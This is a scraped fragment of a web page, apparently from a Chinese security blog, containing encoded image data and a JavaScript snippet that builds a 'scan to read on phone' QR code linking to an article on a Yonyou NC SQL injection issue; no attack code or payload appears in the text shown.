bx1hfau6/2C9FSDkVsnmhPVO8LYB8IhaP6sT+Wuz5A6hTda20Ag0+xT7BzmOYi+em32gcc5iG/efnJRHZKHO668rtsLUquvLu8IX8tbD6mDoPoet4Hsxev6dSdwGAhkehB0az41IsSXixC910F0c2c+JA+P0T6F9j7DytaC9K7r/YLoMOI+88y1+4D0kYuzHoeBzEKX9nMnsPw5ZDVFyLRXW7RONCeH1D/LzYn2myGkN4w4y5Z23rNS9wXp2+sgOgStgJF3HeLbr/B6h3hKb4LbzyE1nf1a7W+fqWvIlFd5mPsQvXrUOquH5M1VzWqZ6QhjDxh5z3fu/bou1++oL3Yfsg/g+kn99mZf22cI3KcE59e+DqcNqVFfoXkRnqtb9YPUA4dIv4e846GwCeaVgY/fjUFQXYS53n045q7PEE/pTXAbiE/BGa72bZ0+ZPor3Zw+JK8O4frqHfULuwfp0fUzXr32yzw8189a676C20C+UnRl/90JHAYCeQpgxLMtQPKrHMQ/e3r0RZjXQXQ4Yt+DvboOqV355iE5udjrIDkY0TxEt26Gh4FYfOFrTuCPBwLj1CH8qy/Hp+WsrufkM7QXjHuCcGsgHILWdTQv6stF9Y766nC83x8PxOYX/p0T+OOB9Kl3DuNTAF/jvkxIHQTVn0H3BKnt3B5dh+T1YeTqIsS3j6i/QkgdcP2kfnuzr8M7xKl2PNs3ZMpnOftC8ituH315R0gfoFtPc+8BfPwEvio0t/K7DulnHYSbU9/jYSCGL3zNCWwDgUwPHuNqm04ZUi8XrYP48hXC45x99whjjZ736Fwdxjr1jjDPQfRVf/t0H1IHd9wGYtGFrz2BayCvPf/D3f8HAAD//842BysAAAAGSURBVAMA8mLgsERB6mwAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-viewPsnCard-download-pk\_rpt\_def-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 